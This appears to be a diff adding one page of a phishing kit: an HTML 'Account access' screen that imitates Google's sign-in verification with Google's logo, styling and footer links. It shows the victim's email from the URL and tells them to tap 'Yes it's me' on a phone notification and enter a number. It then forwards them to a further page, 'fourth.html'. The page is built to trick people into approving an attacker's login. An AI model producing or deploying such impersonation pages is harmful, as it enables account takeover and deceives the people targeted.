@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Account Recovery</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #fff;
+            font-family: "Google Sans", Arial, sans-serif;
+        }
+        
+        .card {
+            max-width: 400px;
+            margin: 40px auto;
+            border: none;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+        }
+        
+        .google-logo {
+            height: 24px;
+            margin-top: 30px;
+        }
+        
+        .email-select {
+            background-color: #f1f3f4;
+            border-radius: 20px;
+            padding: 6px 12px;
+            display: inline-block;
+            font-size: 14px;
+        }
+        
+        .link-blue {
+            color: #1a73e8;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        
+        .link-blue:hover {
+            text-decoration: underline;
+        }
+        
+        footer {
+            font-size: 13px;
+            margin-top: 30px;
+            color: #5f6368;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container text-center">
+        <div class="card p-4">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo" class="google-logo mx-auto">
+
+            <h4 class="mt-3">Account access</h4>
+            <p class="text-muted small">To help keep your account safe, Google wants to make sure it’s really you trying to sign in.</p>
+
+            <div class="email-select my-2" id="userEmailBox">
+                <span class="me-2">📧</span>
+                <span id="emailText">email@example.com</span>
+            </div>
+
+            <h6 class="mt-4">Check your inbox of email above</h6>
+            <p class="text-muted small mb-4">
+                Google sent a notification to your phone. Pull down the notification bar, tap <strong>Yes it's me</strong> on the notification, then tap the <strong>number sent to email inbox</strong> on your phone to verify it’s you.
+            </p>
+
+            <div>
+                <a href="#" class="link-blue d-block" id="noPhoneLink">I don’t have my phone</a>
+            </div>
+        </div>
+
+        <footer class="text-center">
+            <div class="mt-3">English (United States)</div>
+            <div class="mt-1">
+                <a class="link-blue me-2" href="#">Help</a>
+                <a class="link-blue me-2" href="#">Privacy</a>
+                <a class="link-blue" href="#">Terms</a>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        window.onload = function() {
+            const params = new URLSearchParams(window.location.search);
+            const email = params.get('email');
+
+            if (email) {
+                document.getElementById('emailText').textContent = email;
+            }
+
+            document.getElementById('noPhoneLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                const targetUrl = email ?
+                    `fourth.html?email=${encodeURIComponent(email)}` :
+                    'fourth.html';
+                window.location.href = targetUrl;
+            });
+        };
+    </script>
+</body>
+
+</html>
